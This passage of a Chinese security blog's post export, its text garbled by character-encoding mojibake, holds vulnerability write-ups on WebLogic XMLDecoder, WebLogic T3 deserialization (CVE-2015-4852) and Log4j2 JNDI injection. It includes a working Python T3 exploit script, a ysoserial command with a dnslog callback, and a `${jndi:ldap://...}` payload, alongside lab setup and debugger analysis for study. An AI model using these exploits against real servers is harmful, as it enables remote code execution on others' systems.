¼å°±æ‰§è¡Œä¸äº†äº†ï¼‰ï¼š å¦‚æœè¦ä¿®æ”¹å‘½ä»¤çš„è¯å°±æ›´æ”¹å¦‚ä¸‹éƒ¨åˆ†ï¼š 1&lt;string&gt;ping aaa.9y1gq6.dnslog.cn&lt;/string&gt; æ¼æ´åˆ†æåœ¨wlserver&#x2F;server&#x2F;wls-wsat.war&#x2F;WEB-INF&#x2F;web.xmlä¸­å­˜åœ¨ç€è®¸å¤šæ¥å£ï¼ˆæœªæˆªå…¨ï¼‰ï¼š åªè¦å®ƒä»¬èƒ½å¤„ç†SOAPæŠ¥æ–‡ï¼Œå°±å­˜åœ¨XMLDecoderæ¼æ´ å‰äººä»¥åŠç¡®å®šå¥½å¤„ç†çš„å¤§è‡´æµç¨‹è·¯çº¿äº†ï¼Œä¸éœ€è¦æˆ‘ä»¬è‡ªå·±å»æ‰¾ï¼Œæˆ‘ä»¬ç›´æ¥æŠŠæ–­ç‚¹æ‰“åœ¨wlserver\\server\\lib\\weblogic.jar!\\weblogic\\wsee\\jaxws\\workcontext\\WorkContextServerTubeç±»çš„processRequestæ–¹æ³•å¤„ï¼š å¾…æˆ‘ä»¬å‘åŒ…ä¹‹åï¼Œå‘ç°æ­¤å¤„çš„var1å°±æ˜¯æˆ‘ä»¬POSTä¼ å…¥çš„æ•°æ®ï¼š æˆ‘ä»¬æ¥ä¸‹æ¥ç»§ç»­è·Ÿè¿›ï¼Œé¦–å…ˆvar1ä¸ä¸ºnullï¼Œè¿›å…¥var2å’Œvar3çš„èµ‹å€¼æ“ä½œï¼Œvar2æ˜¯æ•°æ®ä¸­çš„headersï¼Œä¹‹åå¯¹var2å¤„ç†ååˆèµ‹å€¼ç»™var3ï¼š åˆ¤æ–­var3ä¸ä¸ºç©ºä¹‹åè¿›å…¥WorkContextServerTubeç±»çš„readHeaderOldæ–¹æ³•ï¼š åˆ°var4çš„æ—¶å€™å°±å·²ç»æ˜¯æˆ‘ä»¬çš„æ¶æ„XMLäº†ï¼š ç»è¿‡ä¸€ç³»åˆ—çš„èµ‹å€¼ï¼Œä¹Ÿå°±æ˜¯å±‚å±‚å°è£…ä¹‹åï¼Œè¿›è¡Œvar6çš„åˆ›å»ºå·¥ä½œï¼Œæˆ‘ä»¬è·Ÿè¿›å»çœ‹ä¸€ä¸‹ï¼š å‘ç°å…¶å®æ˜¯XMLDecoderçš„åˆ›å»ºå·¥ä½œï¼Œé‚£ä¹ˆæˆ‘ä»¬è·Ÿè¿›this.receive(var6)çœ‹ä¸€ä¸‹ï¼š ç»è¿‡èµ‹å€¼æ“ä½œä¹‹åè§¦å‘WorkContextMapImplç±»çš„receiveRequestæ–¹æ³•ï¼š å†è¿›å…¥WorkContextLocalMapç±»çš„receiveRequestæ–¹æ³•ï¼š ä¹‹åæŠŠvar1ä¼ å…¥åˆ°WorkContextEntryImplç±»çš„readEntryæ–¹æ³•ï¼š è·Ÿè¿›readUTFæ–¹æ³•å‘ç°æ­¤å¤„è°ƒç”¨äº†XMLDecoderçš„readObjectæ–¹æ³•è¿›è¡Œäº†ååºåˆ—åŒ– è‡³æ­¤æµç¨‹ç»“æŸ","categories":[],"tags":[]},{"title":"JAVAå®‰å…¨:Weblogicä¹‹CVE-2015-4852ååºåˆ—åŒ–æ¼æ´","slug":"JAVAå®‰å…¨Weblogicä¹‹CVE-2015-4852ååºåˆ—åŒ–æ¼æ´","date":"2024-05-01T06:16:21.261Z","updated":"2024-05-01T11:48:54.548Z","comments":true,"path":"2024/05/01/JAVAå®‰å…¨Weblogicä¹‹CVE-2015-4852ååºåˆ—åŒ–æ¼æ´/","link":"","permalink":"http://example.com/2024/05/01/JAVA%E5%AE%89%E5%85%A8Weblogic%E4%B9%8BCVE-2015-4852%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/","excerpt":"ä½œè€…ï¼šNarcher æ—¶é—´ï¼š2024&#x2F;5&#x2F;1 åˆ†ç±»ï¼šVulnerability Analysis","text":"ä½œè€…ï¼šNarcher æ—¶é—´ï¼š2024&#x2F;5&#x2F;1 åˆ†ç±»ï¼šVulnerability Analysis å‰è¨€åœ¨å¾ˆä¹…ä¹‹å‰å°±å¬è¯´è¿‡weblogicçš„æ¼æ´ï¼Œä½†ä¸€ç›´æ²¡æœ‰å¤ç°è¿‡ï¼Œæœ€è¿‘çœ‹äº†çœ‹ç½‘ä¸Šçš„æ–‡ç« ï¼Œæ„Ÿè§‰æ€»æ˜¯åœ¨ä¸€äº›æˆ‘ç†è§£ä¸äº†çš„æ­¥éª¤é‚£é‡Œè·³è¿‡ï¼Œæ— å¥ˆåªèƒ½è‡ªå·±å†™ä¸€ç¯‡æ¥è®°å½•ä¸€ä¸‹å…·ä½“æµç¨‹ï¼ˆå½“ç„¶ï¼Œåˆ†ææ€è·¯è‚¯å®šè¿˜æ˜¯çœ‹çš„ç½‘ä¸Šå¤§ä½¬ä»¬çš„æ€è·¯ï¼‰ WebLogicæ˜¯ç¾å›½Oracleå…¬å¸å‡ºå“çš„ä¸€ä¸ªapplication serverï¼Œç¡®åˆ‡çš„è¯´æ˜¯ä¸€ä¸ªåŸºäºJAVAEEæ¶æ„çš„ä¸­é—´ä»¶ï¼ŒWebLogicæ˜¯ç”¨äºå¼€å‘ã€é›†æˆã€éƒ¨ç½²å’Œç®¡ç†å¤§å‹åˆ†å¸ƒå¼Webåº”ç”¨ã€ç½‘ç»œåº”ç”¨å’Œæ•°æ®åº“åº”ç”¨çš„Javaåº”ç”¨æœåŠ¡å™¨ã€‚å°†Javaçš„åŠ¨æ€åŠŸèƒ½å’ŒJava Enterpriseæ ‡å‡†çš„å®‰å…¨æ€§å¼•å…¥å¤§å‹ç½‘ç»œåº”ç”¨çš„å¼€å‘ã€é›†æˆã€éƒ¨ç½²å’Œç®¡ç†ä¹‹ä¸­ã€‚ weblogicè¯¦è§£ - ç–¯å­110 - åšå®¢å›­ (cnblogs.com) å®é™…ä¸Šå¯ä»¥ç†è§£æˆæ¯”tomcatè¦6çš„å……é’±ç‰ˆï¼Ÿ æ­£æ–‡ç¯å¢ƒæ­å»ºQAX-A-Team&#x2F;WeblogicEnvironment: Weblogicç¯å¢ƒæ­å»ºå·¥å…· (github.com) ç›´æ¥ä½¿ç”¨ä¸Šè¾¹çš„QAX-A-Teamçš„è„šæœ¬å¯èƒ½ä¼šæœ‰ç‚¹é—®é¢˜ï¼Œè¿™é‡Œæ¨èçœ‹ä¸€ä¸‹Drunkbabyå¤§ä½¬çš„æ–‡ç« ï¼š CVE-2015-4852 WebLogic T3 ååºåˆ—åŒ–åˆ†æ | Drunkbabyâ€™s Blog (drun1baby.top) è‡³äºè¿œç¨‹è°ƒè¯•ç¯èŠ‚ï¼ŒDrunkbabyä½¬è¯´çš„ä¸æ˜¯å¾ˆæ¸…æ¥šï¼Œæˆ‘å°±åœ¨è¿™é‡Œè¡¥å……ä¸€ä¸‹ï¼š åœ¨è™šæ‹Ÿæœºç»ˆç«¯è¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼š 123456789#è¿›å…¥å®¹å™¨sudo docker exec -it weblogic1036jdk7u21 /bin/bashcd /u01/app/oracle/cp -r middleware/ /root/WeblogicEnvironment-master/exit#å®¿ä¸»æœºæ‰§è¡Œsudo docker cp 7a84dc24433b:/root/WeblogicEnvironment-master . sudo chown -R root:root WeblogicEnvironment-mastertar czvf newfile.tar.gz WeblogicEnvironment-master ä¹‹åå°†newfile.tar.gzå¤åˆ¶åˆ°æœ‰IDEAçš„æœºå­ä¸Šï¼Œå°†å…¶è§£å‹åï¼Œç”¨IDEAæ‰“å¼€WeblogicEnvironment-master\\wlserverç›®å½•ï¼Œé…ç½®å¥½SDKå’ŒRemoteè¿œç¨‹è°ƒè¯•å³å¯ï¼š weblogicç¯å¢ƒéƒ¨ç½²ä¸è¿œç¨‹è°ƒè¯• | æå®¢æ— å½± (bleke.top) ä¸Šè¾¹è¿™ç¯‡æ–‡ç« å¯¹ä¹‹åçš„æ­¥éª¤è®²çš„å¾ˆè¯¦ç»†ï¼Œæˆ‘å°±ä¸é‡å¤äº† æ¼æ´å¤ç°ä½¿ç”¨ä¸‹åˆ—è„šæœ¬ï¼š 123456789101112131415161718192021222324252627282930import socketimport structdef exp(host, port): sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) server_address = (host, int(port)) data = &quot;&quot; try: sock.connect(server_address) headers = &#x27;t3 12.2.1\\nAS:255\\nHL:19\\n\\n&#x27;.format(port) sock.sendall(headers.encode()) # å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå­—èŠ‚å¯¹è±¡ data = sock.recv(2) f = open(&#x27;./payload&#x27;, &#x27;rb&#x27;) payload_obj = f.read() f.close() payload1 = bytes.fromhex(&quot;000005ba016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000&quot;) payload3 = bytes.fromhex(&quot;aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c00007870774b210000000000000000000d31302e3130312e3137302e3330000d31302e3130312e3137302e33300f0371a20000000700001b59ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c00007870771d01a621b7319cc536a1000a3137322e31392e302e32f7621bb50000000078&quot;) payload2 = payload_obj payload = payload1 + payload2 + payload3 payload = struct.pack(&#x27;&gt;I&#x27;, len(payload)) + payload[4:] sock.send(payload) data = sock.recv(4096) except socket.error as e: print (u&#x27;socket è¿æ¥å¼‚å¸¸ï¼&#x27;) finally: sock.close()exp(&#x27;192.168.58.128&#x27;, 7001) å…¶ä¸­ï¼Œpayloadæ˜¯ysoserialçš„è¾“å‡ºï¼š 1java -jar ysoserial.jar CommonsCollections1 &quot;ping jiznv3.dnslog.cn&quot; &gt; payload ä¹‹åç›´æ¥è¿è¡ŒæŸ¥çœ‹dnslogï¼š å‘½ä»¤æ‰§è¡ŒæˆåŠŸ æ¼æ´åˆ†ææˆ‘ä»¬å°†æ–­ç‚¹æ‰“åœ¨InboundMsgAbbrevç±»çš„readObjectæ–¹æ³•å¤„ï¼š ä¹‹åè¿è¡Œè„šæœ¬ï¼ŒæŸ¥çœ‹æ–­ç‚¹å¤„çš„çŠ¶æ€ï¼Œé¦–å…ˆæ˜¯var2çš„èµ‹å€¼ï¼Œä¹‹åä¼šè¿›å…¥case0ï¼Œæˆ‘ä»¬å…ˆçœ‹ä¸€ä¸‹ServerChannelInputStreamç±»çš„åˆ›å»ºå·¥ä½œ å®é™…ä¸Šè¿™ä¸ªå°±æ˜¯InboundMsgAbbrevç±»é‡Œçš„ä¸€ä¸ªå†…éƒ¨ç±»ï¼Œæˆ‘ä»¬ç»§ç»­è·Ÿè¿›åˆ°MsgAbbrevInputStreamç±»çš„getServerChannelæ–¹æ³•ï¼š æ­¤æ—¶connectionä¹Ÿæ˜¯ä¸€ä¸ªå†…éƒ¨ç±»weblogic.rjvm.t3.MuxableSocketT3$T3MsgAbbrevJVMConnection@7a17787eï¼Œç”¨äºweblogicæœåŠ¡å™¨å’ŒJVMä¹‹é—´ä½¿ç”¨T3åè®®ä¼ è¾“æ•°æ®ï¼Œä¹‹åè·Ÿè¿›getChannelæ–¹æ³•ï¼Œå¯ä»¥çœ‹å‡ºå¤§è‡´ä¸Šå°±æ˜¯å¯¹T3åè®®ä¼ è¾“æ•°æ®çš„å¤„ç†ï¼š è‡³äºä¹‹åçš„getChannelæ–¹æ³•ï¼Œå°±æ˜¯æŠŠsocketä¼ å…¥æ•°æ®çš„å¤„ç†ç»“æœè¿›è¡Œè¿”å› ä¹‹åä¾¿å‡ºæ¥äº†ï¼Œå¼€å§‹æ‰§è¡ŒServerChannelInputStreamç±»çš„readObjectæ–¹æ³•ï¼Œä½†è¿™ä¸ªç±»å¹¶æœªå¯¹readObjectæ–¹æ³•è¿›è¡Œé‡å†™ï¼Œè€Œæ˜¯è§¦å‘äº†ç»§æ‰¿è‡ªå…¶çˆ¶ç±»ObjectInputStreamç±»çš„readObjectæ–¹æ³•ï¼š çœ‹åˆ°è¿™é‡Œè‡ªç„¶å°±æƒ³èµ·ä¹‹å‰å­¦CCé“¾çš„æ—¶å€™ï¼Œæœ€ç»ˆåºåˆ—åŒ–å’Œååºåˆ—åŒ–æ“ä½œçš„ç¼–å†™äº†ï¼Œæˆ‘è¿™é‡ŒæŠŠå®ƒä»¬æ‹¿è¿‡æ¥ï¼š 123456//åºåˆ—åŒ–ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC1.txt&quot;));oos.writeObject(o);//ååºåˆ—åŒ–ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC1.txt&quot;));ois.readObject(); æ‰€ä»¥è¯´èµ°åˆ°è¿™æ­¥å°±å¯ä»¥åœä¸‹æ¥äº†ï¼Œå‰©ä¸‹çš„å°±æ˜¯æœ€åŸºæœ¬çš„ååºåˆ—åŒ–æ“ä½œ è¯´ç™½äº†å°±æ˜¯weblogicåœ¨å¤„ç†T3åè®®ä¼ å…¥çš„åºåˆ—åŒ–æ•°æ®æ—¶è°ƒç”¨äº†ObjectInputStreamç±»çš„readObjectæ–¹æ³•è€Œåˆæ²¡åŠ ä»»ä½•é™åˆ¶ï¼Œä»è€Œå¯¼è‡´çš„ååºåˆ—åŒ–æ¼æ´ä¸­CCé“¾çš„æ‰§è¡Œ T3åè®®å­¦ä¹ T3 åè®®å…¶å®å°±æ˜¯Weblogic RMI è°ƒç”¨æ—¶çš„é€šä¿¡åè®®ï¼Œæ¥çœ‹ä¸€ä¸‹z_zz_zzzå¸ˆå‚…çš„å›¾ï¼š æ­¤æ—¶æˆ‘ä»¬å›å¤´çœ‹EXPè„šæœ¬ä¸­çš„å†…å®¹ï¼Œå‘ç°åœ¨payloadçš„å‰åéƒ½åŠ ä¸Šäº†ä¸€ä¸²æ•°æ®ï¼Œè¿™å…¶å®å°±æ˜¯T3åè®®çš„æ ¼å¼ï¼ˆåè¾¹çš„æœ‰æ²¡æœ‰å¥½åƒæ— æ‰€è°“ï¼Ÿï¼‰ ç¬¬ä¸€éƒ¨åˆ†æ˜¯è¯·æ±‚åŒ…çš„å¤´éƒ¨ï¼Œt3+weblogicå®¢æˆ·ç«¯çš„ç‰ˆæœ¬å·ï¼Œç¬¬äºŒéƒ¨åˆ†æ˜¯weblogicæœåŠ¡å™¨çš„è¿”å›æ•°æ®ï¼ŒHELO+weblogicæœåŠ¡å™¨ç‰ˆæœ¬å·ï¼Œç¬¬ä¸‰éƒ¨åˆ†å°±æ˜¯æˆ‘ä»¬æ‹¼æ¥çš„payloadäº† åå…­è¿›åˆ¶å¦‚ä¸‹ï¼š å¯ä»¥åœ¨00000078å¯¹åº”çš„è¡Œæ•°çœ‹åˆ°åå…­è¿›åˆ¶çš„ac ed 00 05ï¼Œè¯´æ˜è¿™åè¾¹è·Ÿçš„å°±æ˜¯æˆ‘ä»¬çš„Javaåºåˆ—åŒ–æ•°æ® è¿›ä¸€æ­¥çš„å­¦ä¹ æ¨èå»çœ‹ä¿®å¤weblogicçš„JAVAååºåˆ—åŒ–æ¼æ´çš„å¤šç§æ–¹æ³• | WooYunçŸ¥è¯†åº“ (xmd5.com)è¿™ç¯‡æ–‡ç«  å°ç»“è¦å­¦çš„ä¸œè¥¿è¿˜æœ‰å¾ˆå¤šã€‚ã€‚ã€‚ã€‚ã€‚ã€‚","categories":[],"tags":[]},{"title":"JAVAå®‰å…¨:Log4j2è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´","slug":"JAVAå®‰å…¨Log4j2è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´","date":"2024-04-25T06:52:22.999Z","updated":"2024-09-15T13:06:27.255Z","comments":true,"path":"2024/04/25/JAVAå®‰å…¨Log4j2è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´/","link":"","permalink":"http://example.com/2024/04/25/JAVA%E5%AE%89%E5%85%A8Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","excerpt":"ä½œè€…ï¼šNarcher æ—¶é—´ï¼š2024&#x2F;4&#x2F;25 åˆ†ç±»ï¼šVulnerability Analysis","text":"ä½œè€…ï¼šNarcher æ—¶é—´ï¼š2024&#x2F;4&#x2F;25 åˆ†ç±»ï¼šVulnerability Analysis å‰è¨€å› ä¸ºåœ¨åšNSSCTFé¢˜åº“é‡Œè¾¹çš„Javaé¢˜çš„æ—¶å€™ï¼Œç¢°åˆ°äº†ä¸€ä¸ªFastjsonååºåˆ—åŒ–+Log4jçš„æ¼æ´ã€‚å‰è¾¹å­¦ä¹ äº†Fastjsonååºåˆ—åŒ–æ¼æ´ï¼Œè€ŒLog4jæ¼æ´æ¯”è¾ƒè€äº†ï¼ŒLog4j2æ¼æ´æ¯”è¾ƒæ–°ï¼Œäºæ˜¯å°±å¼€å§‹å­¦ä¹ ä¸€ä¸‹Log4j2çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚ Apache Log4j2æ˜¯ä¸€ä¸ªå¼€æºçš„æ—¥å¿—è®°å½•ç»„ä»¶ï¼Œä½¿ç”¨éå¸¸çš„å¹¿æ³›ã€‚åœ¨å·¥ç¨‹ä¸­ä»¥æ˜“ç”¨æ–¹ä¾¿ä»£æ›¿äº† System.out ç­‰æ‰“å°è¯­å¥ï¼Œå®ƒæ˜¯JAVAä¸‹æœ€æµè¡Œçš„æ—¥å¿—è¾“å…¥å·¥å…·ã€‚ ä½¿ç”¨ Log4j2 åœ¨ä¸€å®šåœºæ™¯æ¡ä»¶ä¸‹å¤„ç†æ¶æ„æ•°æ®æ—¶ï¼Œå¯èƒ½ä¼šé€ æˆæ³¨å…¥ç±»ä»£ç æ‰§è¡Œã€‚ä¸‹é¢æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹å…·ä½“æµç¨‹ã€‚ æ­£æ–‡1.ç¯å¢ƒæ­å»ºæ–°å»ºmavené¡¹ç›®ï¼Œåœ¨pom.xmlä¸­åŠ å…¥ä»¥ä¸‹ä¾èµ–ï¼š 12345678910111213141516&lt;dependency&gt; &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j-core&lt;/artifactId&gt; &lt;version&gt;2.14.1&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j-api&lt;/artifactId&gt; &lt;version&gt;2.14.1&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;4.12&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt;&lt;/dependency&gt; è‡³äºjdkç‰ˆæœ¬ï¼Œæˆ‘ç”¨çš„æ˜¯8u65ï¼Œå› ä¸ºLog4jçš„2.13ç‰ˆæœ¬ä»¥ä¸Šå¯¹1.8ç‰ˆæœ¬ä¹‹å‰çš„ä¸å…¼å®¹å˜›ï¼Œä½†è¦ä½äº8u191ï¼Œå› ä¸ºä¹‹åçš„ç‰ˆæœ¬å¯¹äºä»è¯·æ±‚ldapæœåŠ¡å¹¶è·å–Codebaseè·¯å¾„ä¹‹åï¼Œåœ¨è¯·æ±‚Codebaseä¸‹è½½Classæ–‡ä»¶æµç¨‹ä¸­çš„è¯·æ±‚Codebaseè¿‡ç¨‹ä¸­é»˜è®¤å…³é—­äº†trustUrlCodebaseï¼Œæ‰€ä»¥ä¸ä¼šå»è¯·æ±‚Codebase ç„¶åæ—¥å¿—ä¹Ÿè¦è¾“å‡ºï¼Œæˆ‘ä»¬åœ¨src&#x2F;main&#x2F;resourcesç›®å½•ä¸‹æ·»åŠ ä¸€ä¸ªlog4j2.xmlæ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;configuration status=&quot;info&quot;&gt; &lt;Properties&gt; &lt;Property name=&quot;pattern1&quot;&gt;[%-5p] %d %c - %m%n&lt;/Property&gt; &lt;Property name=&quot;pattern2&quot;&gt; =========================================%n æ—¥å¿—çº§åˆ«ï¼š%p%n æ—¥å¿—æ—¶é—´ï¼š%d%n æ‰€å±ç±»åï¼š%c%n æ‰€å±çº¿ç¨‹ï¼š%t%n æ—¥å¿—ä¿¡æ¯ï¼š%m%n &lt;/Property&gt; &lt;Property name=&quot;filePath&quot;&gt;logs/myLog.log&lt;/Property&gt; &lt;/Properties&gt; &lt;appenders&gt; &lt;Console name=&quot;Console&quot; target=&quot;SYSTEM_OUT&quot;&gt; &lt;PatternLayout pattern=&quot;$&#123;pattern1&#125;&quot;/&gt; &lt;/Console&gt; &lt;RollingFile name=&quot;RollingFile&quot; fileName=&quot;$&#123;filePath&#125;&quot; filePattern=&quot;logs/$$&#123;date:yyyy-MM&#125;/app-%d&#123;MM-dd-yyyy&#125;-%i.log.gz&quot;&gt; &lt;PatternLayout pattern=&quot;$&#123;pattern2&#125;&quot;/&gt; &lt;SizeBasedTriggeringPolicy size=&quot;5 MB&quot;/&gt; &lt;/RollingFile&gt; &lt;/appenders&gt; &lt;loggers&gt; &lt;root level=&quot;info&quot;&gt; &lt;appender-ref ref=&quot;Console&quot;/&gt; &lt;appender-ref ref=&quot;RollingFile&quot;/&gt; &lt;/root&gt; &lt;/loggers&gt;&lt;/configuration&gt; è€Œå…¶å…·ä½“çš„è¾“å‡ºåˆ™ä¼šè¾“å‡ºåˆ°logsç›®å½•ä¸‹çš„myLog.logæ–‡ä»¶ä¸­ ä¹‹åçš„æµ‹è¯•ä»£ç æˆ‘ä¹Ÿä»è¿™é‡Œè´´å‡ºæ¥ï¼š 123456789101112import org.apache.logging.log4j.LogManager;import org.apache.logging.log4j.Logger;import java.util.function.LongFunction;public class Test2 &#123; public static void main(String[] args) &#123; Logger logger = LogManager.getLogger(LongFunction.class); String username = &quot;$&#123;jndi:ldap://127.0.0.1:7777/TestRef&#125;&quot;; logger.info(&quot;User &#123;&#125; login in!&quot;, username); &#125;&#125; æ•´ä¸ªé¡¹ç›®å·®ä¸å¤šé•¿è¿™æ ·ï¼ŒTest.javaä¸ç”¨ç®¡ï¼š 2.æ¼æ´å¤ç°å¦‚æœæˆ‘ä»¬æ­£å¸¸ä¼ å…¥usernameï¼Œè¾“å‡ºå¦‚ä¸‹ï¼š è€Œåœ¨å…¶å®˜æ–¹æ–‡æ¡£Log4j â€“ Log4j 2 Lookups (apache.org)ä¸­æåˆ°äº†è¿™æ ·çš„ä¸€ä¸ªä¸œè¥¿ï¼š æˆ‘ä»¬æŠŠusernameä¿®æ”¹æˆ${java:os}çœ‹ä¸€ä¸‹æƒ…å†µï¼š è¾“å‡ºäº†osçš„ç‰ˆæœ¬ï¼Œè¿™ä¸ªçš„å±å®³å€’ä¹Ÿä¸æ˜¯å¾ˆå¤§ï¼ŒçœŸæ­£æœ‰å±å®³çš„æ˜¯ä¸‹è¾¹çš„è¿™ä¸ªï¼š æ”¯æŒjndiæŸ¥è¯¢ï¼Œè¿™æ ·çš„è¯ï¼Œå¦‚æœç›®æ ‡å‡ºç½‘ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨Jndiæ³¨å…¥è¿œç¨‹æ‰§è¡Œæ¶æ„ä»£ç ï¼Œå…·ä½“æµç¨‹å¦‚ä¸‹ï¼š åœ¨æœ¬åœ°æ¶æ„ç±»TestRef.classçš„ç›®å½•å¤„èµ·ä¸€ä¸ªhttpæœåŠ¡ï¼Œä¹‹åå†å ä¸€ä¸ªldapæœåŠ¡ï¼Œå…·ä½“ä»£ç åœ¨Fastjsonçš„å¤ç°é‡Œè´´äº†ï¼Œè¿™é‡Œå°±ä¸å†æ¬è¿‡æ¥äº†ã€‚æœåŠ¡æ­å»ºèµ·æ¥åè¿è¡ŒTest2å³å¯è¿œç¨‹åŠ è½½æ¶æ„ç±»è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼š å‘ç°æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ï¼Œå¹¶ä¸”è²Œä¼¼å‘½ä»¤è¿˜æ‰§è¡Œäº†ä¸¤éï¼Œæˆ‘ä»¬ä¸‹é¢æ¥è°ƒè¯•çœ‹çœ‹å…·ä½“æµç¨‹ 3.æ¼æ´åˆ†æè¿™é‡Œæ˜¯è·Ÿç€Drun1babyå¸ˆå‚…çš„æ€è·¯èµ°çš„ï¼Œå…¶å®åˆšå¼€å§‹æ‰“äº†å‡ ä¸ªæ–­ç‚¹å‡†å¤‡ä»å¤´å¼€å§‹ä¸€ç‚¹ç‚¹çœ‹ï¼Œ ä½†ç­‰çœ‹åˆ°PatternLayoutè¿™ä¸ªç±»ä¹‹åå‘ç°ç¡®å®é‡ç‚¹åœ¨è¿™åè¾¹ï¼Œå‰è¾¹éƒ½æ˜¯äº›èµ‹å€¼ä¹‹ç±»çš„æ“ä½œ ä»PatternLayoutç±»çš„toSerializableæ–¹æ³•å¼€å§‹æ‰“ä¸ªæ–­ç‚¹ï¼š è¿™é‡Œçš„ä¼ å‚ä¸­ï¼ŒeventåŒ…å«äº†æˆ‘ä»¬çš„ä¼ å‚ï¼Œæ­¤åˆ»bufferè¿˜ä¸ºç©ºï¼Œæˆ‘ä»¬ç»§ç»­å¾€ä¸‹çœ‹ï¼š è¿›å…¥äº†è¿™ä¸ªforå¾ªç¯ä¹‹åå°±åŠ ä¸Šè°ƒç”¨formatæ–¹æ³•ç»™bufferèµ‹å€¼ï¼Œå¤§è‡´æµç¨‹å¦‚ä¸‹ï¼š å…ˆè¿›å…¥formatæ–¹æ³•ï¼š ç„¶åä¼šæ ¹æ®skipFormattingInfoçš„æƒ…å†µåˆ†åˆ«è¿›å…¥ä¸åŒçš„æƒ…å†µï¼Œè¿™é‡Œè¿›å…¥çš„formatæ–¹æ³•å–å†³äºthisçš„converterçš„å€¼ï¼š åƒä¸Šå›¾è¿™ç§å°±ä¼šè¿›å…¥LiteralPatternConverterç±»çš„formatæ–¹æ³•ä¸­ å°±è¿™æ ·å¾ªç¯äº†7æ¬¡åï¼Œä¼šè¿›å…¥MessagePatternConverterç±»çš„formatæ–¹æ³•ï¼š è¿™é‡Œæœ‰ä¸ªå…³é”®çš„å­—ç¬¦ä¸²æå–ï¼Œå…ˆåˆ¤æ–­å­—ç¬¦ä¸²ä¸­æ˜¯å¦æœ‰${çš„ç»„åˆï¼Œä¹‹åä¼šæå–å‡º${}ä¹‹é—´çš„æ‰€æœ‰å­—ç¬¦ï¼Œæˆ‘ä»¬è·Ÿè¿›StrSubstitutorç±»çš„replaceæ–¹æ³•çœ‹ä¸€çœ‹ï¼š ä¹‹åä¼šè¿›å…¥StrSubstitutorç±»çš„substituteæ–¹æ³•ï¼ˆåœ¨307è¡Œï¼‰ï¼š ä¹‹åè¿™ä¸ªsubstituteæ–¹æ³•æ¥ç€è°ƒç”¨311è¡Œçš„substituteæ–¹æ³•ï¼Œè¿™é‡Œè¾¹ç»è¿‡ä¸€ç³»åˆ—çš„åˆ¤æ–­ä¹‹åï¼Œä¼šæå–å‡º${}ä¹‹é—´çš„æ‰€æœ‰å­—ç¬¦çš„æ‰€æœ‰å­—ç¬¦ï¼Œå¹¶èµ‹å€¼ç»™varNameï¼š ä¹‹åä¼šè¿›å…¥resolveVariableæ–¹æ³•ï¼š è¿™é‡Œçš„resolveré€šè¿‡getVariableResolverè·å–åˆ°äº†å¦‚ä¸‹çš„å€¼ï¼Œå¯è§ä¸æ­¢æœ‰jndiï¼Œæˆ‘ä»¬å¯ä»¥åˆ¤æ–­å‡ºè¿™é‡Œæåˆ°çš„å€¼éƒ½å¯ä»¥åœ¨ä»¥ååˆ©ç”¨ï¼š 